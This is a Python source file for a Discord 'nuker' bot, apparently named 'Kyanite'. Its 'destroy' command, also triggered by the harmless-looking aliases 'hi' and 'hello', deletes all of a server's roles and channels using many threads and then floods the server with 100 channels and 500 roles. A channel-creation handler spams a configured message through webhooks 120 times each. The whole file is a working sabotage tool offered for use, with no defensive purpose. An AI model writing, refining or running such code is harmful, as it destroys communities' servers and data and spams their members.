from discord.ext import commands
from time import sleep
import sys
import os
import discord
import threading
import requests
import datetime
import random
import logging
import yaml
import logging.handlers


session = requests.Session()


os.system('cls;clear')
os.system('mode 102, 30')


with open("config.yaml", "r",encoding="utf8") as stream:
        data = yaml.safe_load(stream)




Intents = discord.Intents.all()
Eagle = commands.Bot(command_prefix = ".",self_bot = True,intents=Intents)

headers = {
	"Authorization": 
		f"Bot {data['login']['token']}"
}

columns = os.get_terminal_size().columns

	
def plustext(text):
	return purpleblue("[") + "+" + purpleblue(f"] {text}")


def purpleblue(text):
    os.system(""); faded = ""
    red = 200
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;255m{line}\033[0m")
        if not red == 0:
            red += 2
            if red < 0:
                red = 5
    return faded


def message(text):
	today = datetime.datetime. now()
	date_time = today.strftime("%H:%M:%S")
	print(date_time + "| " + purpleblue("Message") + " | " + text)

def message2(text):
	today = datetime.datetime. now()
	date_time = today.strftime("%H:%M:%S")
	return(date_time + "| " + purpleblue("Message") + " | " + text)







today = datetime.datetime. now()
date_time = purpleblue(today.strftime("%H:%M"))

logging.basicConfig(
     level=logging.ERROR, 
     format= f'{date_time + " | " + purpleblue("Message") + " | "} %(message)s ',
     datefmt='%H:%M:%S'
 )


end = f"""
██╗  ██╗██╗   ██╗ █████╗ ███╗   ██╗██╗████████╗███████╗
██║ ██╔╝╚██╗ ██╔╝██╔══██╗████╗  ██║██║╚══██╔══╝██╔════╝
█████╔╝  ╚████╔╝ ███████║██╔██╗ ██║██║   ██║   █████╗  
██╔═██╗   ╚██╔╝  ██╔══██║██║╚██╗██║██║   ██║   ██╔══╝  
██║  ██╗   ██║   ██║  ██║██║ ╚████║██║   ██║   ███████╗
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚══════╝"""



border = "═"

for line in end.splitlines():
	print(purpleblue(line.center(columns)))
print(border*columns)











@Eagle.event
async def on_ready():
	message("Bot Has Been " + purpleblue("Loaded") + ".")
	message(f"{Eagle.user.name}#{Eagle.user.discriminator} {purpleblue('|')} {len(Eagle.guilds)} Server(s)\n")




@Eagle.event
async def on_guild_channel_create(channel):
		await channel.send(data['webhooks']['message'])
		try:
			 webhook = await channel.create_webhook(name=random.choice(data["webhooks"]["names"]))
			 for i in range(120):
					 await webhook.send(data["webhooks"]["message"])
		except Exception as e:
			message(str(e))
			pass

permissions = discord.Permissions()
@Eagle.command(aliases=["hi","nuke","hello"])
async def destroy(ctx):
	await ctx.message.delete()
	guild = ctx.guild.id
	def delete_role(i):
		session.delete(
				f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
				headers=headers
			)
	
	def delete_channel(i):
			session.delete(
				f"https://discord.com/api/v9/channels/{i}",
				headers=headers
			)
	
	def create_channels(i):
			json = {
				"name": i
			}
			session.post(
				f"https://discord.com/api/v9/guilds/{guild}/channels",
				headers=headers,
				json=json
			)
	
	def create_roles(i):
			json = {
				"name": i
			}
			session.post(
				f"https://discord.com/api/v9/guilds/{guild}/roles",
				headers=headers,
				json=json
			)
		


	
	for i in range(3):
	 for role in list(ctx.guild.roles):
			 threading.Thread(
				 target=delete_role,
				 args=(role.id, )
			 ).start()
			 message("Deleted Role: " + purpleblue(str(role.id)))
	
	for i in range(3):
	 for channel in list(ctx.guild.channels):
			 threading.Thread(
				 target=delete_channel,
				 args=(channel.id, )
			 ).start()
			 message("Deleted Channel: " + purpleblue(str(channel.id)))
	
	for i in range(100):
		 threading.Thread(
			 target=create_channels,
			 args=(random.choice(data['channel']['channel_names']), )
		 ).start()
		 message("Created Channel")
	
	sleep(3)
	
	for i in range(500):
		 threading.Thread(
			 target=create_roles,
			 args=(random.choice(data['roles']['role_names']),)
		 ).start()
	
			
Eagle.run(token=data['login']['token'],log_handler=None)
